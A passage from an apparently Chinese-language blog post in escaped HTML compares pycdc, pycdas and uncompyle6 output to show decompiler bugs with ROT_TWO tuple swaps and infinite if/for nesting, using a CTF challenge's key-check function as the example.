                &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;      BINARY_LSHIFT           
                &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;      ROT_TWO                 
                &lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt;      STORE_FAST              &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;: res
                &lt;span style=&#34;color:#ae81ff&#34;&gt;54&lt;/span&gt;      STORE_FAST              &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;: b
                &lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt;      JUMP_ABSOLUTE           &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;
                &lt;span style=&#34;color:#ae81ff&#34;&gt;58&lt;/span&gt;      POP_BLOCK               
                &lt;span style=&#34;color:#ae81ff&#34;&gt;60&lt;/span&gt;      JUMP_ABSOLUTE           &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;
                &lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt;      POP_BLOCK               
                &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;      LOAD_FAST               &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;: res
                &lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt;      RETURN_VALUE            
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;gen_prime&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;明显有个 &lt;code&gt;ROT_TWO&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;后来队友手写了一个demo测试了一下&lt;/p&gt;
&lt;p&gt;手写的为&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; b
b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; b
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;和&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;a, b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; b, a &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; b
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后pycdc结果都是&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; b
b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; b
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;pycdas结果则是一个有 &lt;code&gt;ROT_TWO&lt;/code&gt;，一个没有，是正确的&lt;/p&gt;
&lt;h3 id=&#34;if判断后接for循环时出现无限嵌套&#34;&gt;if判断后接for循环时出现无限嵌套&lt;/h3&gt;
&lt;p&gt;在做INSHACK2017那道题的时候，一开始电脑里没装uncompyle6，于是打算拿pycdc解，但运行了一下，发现直接生成了一个2G的文件，要不是SegmentFault了估计还能生成，用pycdas解了一下，感觉没什么问题&lt;/p&gt;
&lt;p&gt;pycdc卡住的部分：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;activate&lt;/span&gt;(self, s):
        print_dbg(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;call: activate(self, s=&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;gt;)&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; s)
        blocks &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;-&amp;#39;&lt;/span&gt;)
        blocks_sz &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; len(blocks)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; blocks_sz &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;:
            print_dbg(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;err: incorrect number of blocks (&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;)&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; blocks_sz)
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;
        :
            print_dbg(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;call: activate(self, s=&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;gt;)&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; s)
            blocks &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;-&amp;#39;&lt;/span&gt;)
            blocks_sz &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; len(blocks)
            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; blocks_sz &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;:
                print_dbg(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;err: incorrect number of blocks (&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;)&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; blocks_sz)
                &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;
            :
                print_dbg(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;call: activate(self, s=&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;gt;)&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; s)
                blocks &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;-&amp;#39;&lt;/span&gt;)
                blocks_sz &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; len(blocks)
                &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; blocks_sz &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;:
                    print_dbg(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;err: incorrect number of blocks (&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;)&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; blocks_sz)
                    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;
                :
                    print_dbg(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;call: activate(self, s=&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;gt;)&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; s)
                    blocks &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;-&amp;#39;&lt;/span&gt;)
                    blocks_sz &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; len(blocks)
                    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; blocks_sz &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;:
                        print_dbg(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;err: incorrect number of blocks (&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;)&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; blocks_sz)
                        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;
                    :
                    &lt;span style=&#34;color:#75715e&#34;&gt;# 后面就是无限嵌套了&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;uncompyle6结果&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;activate&lt;/span&gt;(self, s):
        print_dbg(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;call: activate(self, s=&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;gt;)&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; s)
        blocks &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;-&amp;#39;&lt;/span&gt;)
        blocks_sz &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; len(blocks)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; blocks_sz &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;:
            print_dbg(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;err: incorrect number of blocks (&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;)&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; blocks_sz)
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; k &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, blocks_sz):
            self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;z &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;block(blocks[k], self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;z)
            print_dbg(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;dbg: new z is: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;z)
            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;z &lt;span style=&#34;color:#f92672&#34;&gt;is&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;:
                print_dbg(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;err: block function returned error&amp;#39;&lt;/span&gt;)
                &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;z &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;checksum[k]:
                print_dbg(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;err: incorrect checksum (z=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; tested against checksum[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;]=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;)&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; (self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;z, k, self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;checksum[k]))
                &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;

        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;pycdas结果&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;                [Code]
                    File Name: src&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;standalone&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;cctv_manager_standalone&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;py
                    Object Name: activate
                    Arg Count: &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
                    KW Only Arg Count: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
                    Locals: &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;
                    Stack Size: &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;
                    Flags: &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00000043&lt;/span&gt; (CO_OPTIMIZED &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; CO_NEWLOCALS &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; CO_NOFREE)
                    [Names]
                        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;print_dbg&amp;#39;&lt;/span&gt;
                        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;split&amp;#39;&lt;/span&gt;
                        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;len&amp;#39;&lt;/span&gt;
                        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;range&amp;#39;&lt;/span&gt;
                        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;block&amp;#39;&lt;/span&gt;
                        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;z&amp;#39;&lt;/span&gt;
                        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;checksum&amp;#39;&lt;/span&gt;
                    [Var Names]
                        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;self&amp;#39;&lt;/span&gt;
                        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;s&amp;#39;&lt;/span&gt;
                        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;blocks&amp;#39;&lt;/span&gt;
                        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;blocks_sz&amp;#39;&lt;/span&gt;
                        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;k&amp;#39;&lt;/span&gt;
                    [Free Vars]
                    [Cell Vars]
                    [Constants]
                        &lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;
                        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;call: activate(self, s=&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;gt;)&amp;#39;&lt;/span&gt;
                        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;-&amp;#39;&lt;/span&gt;
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;
                        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;err: incorrect number of blocks (&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;)&amp;#39;&lt;/span&gt;
                        &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
                        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;dbg: new z is: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
                        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;err: block function returned error&amp;#39;&lt;/span&gt;
                        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;err: incorrect checksum (z=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; tested against checksum[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;]=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;)&amp;#39;&lt;/span&gt;
                        &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;
                    [Disassembly]
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;       LOAD_GLOBAL             &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;: print_dbg
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;       LOAD_CONST              &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;call: activate(self, s=&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;gt;)&amp;#39;&lt;/span&gt;
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;       LOAD_FAST               &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;: s
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;       BINARY_MODULO           
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;      CALL_FUNCTION           &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;      POP_TOP                 
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;      LOAD_FAST               &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;: s
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;      LOAD_ATTR               &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;: split
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;      LOAD_CONST              &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;-&amp;#39;&lt;/span&gt;
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;      CALL_FUNCTION           &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;      STORE_FAST              &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;: blocks
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;      LOAD_GLOBAL             &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;: len
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;      LOAD_FAST               &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;: blocks
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;      CALL_FUNCTION           &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;38&lt;/span&gt;      STORE_FAST              &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;: blocks_sz
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt;      LOAD_FAST               &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;: blocks_sz
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt;      LOAD_CONST              &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;47&lt;/span&gt;      COMPARE_OP              &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt;)
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;      POP_JUMP_IF_FALSE       &lt;span style=&#34;color:#ae81ff&#34;&gt;71&lt;/span&gt;
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;53&lt;/span&gt;      LOAD_GLOBAL             &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;: print_dbg
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt;      LOAD_CONST              &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;err: incorrect number of blocks (&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;)&amp;#39;&lt;/span&gt;
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt;      LOAD_FAST               &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;: blocks_sz
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt;      BINARY_MODULO           
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;      CALL_FUNCTION           &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt;      POP_TOP                 
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;67&lt;/span&gt;      LOAD_CONST              &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt;      RETURN_VALUE            
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;71&lt;/span&gt;      SETUP_LOOP              &lt;span style=&#34;color:#ae81ff&#34;&gt;156&lt;/span&gt; (to &lt;span style=&#34;color:#ae81ff&#34;&gt;230&lt;/span&gt;)
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;74&lt;/span&gt;      LOAD_GLOBAL             &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;: range
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;77&lt;/span&gt;      LOAD_CONST              &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt;      LOAD_FAST               &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;: blocks_sz
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;83&lt;/span&gt;      CALL_FUNCTION           &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;86&lt;/span&gt;      GET_ITER                
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt;      FOR_ITER                &lt;span style=&#34;color:#ae81ff&#34;&gt;139&lt;/span&gt; (to &lt;span style=&#34;color:#ae81ff&#34;&gt;229&lt;/span&gt;)
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;90&lt;/span&gt;      STORE_FAST              &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;: k
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;93&lt;/span&gt;      LOAD_FAST               &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;: self
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;96&lt;/span&gt;      LOAD_ATTR               &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;: block
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;99&lt;/span&gt;      LOAD_FAST               &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;: blocks
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;102&lt;/span&gt;     LOAD_FAST               &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;: k
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;105&lt;/span&gt;     BINARY_SUBSCR           
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;106&lt;/span&gt;     LOAD_FAST               &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;: self
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;109&lt;/span&gt;     LOAD_ATTR               &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;: z
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;112&lt;/span&gt;     CALL_FUNCTION           &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;115&lt;/span&gt;     LOAD_FAST               &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;: self
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;118&lt;/span&gt;     STORE_ATTR              &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;: z
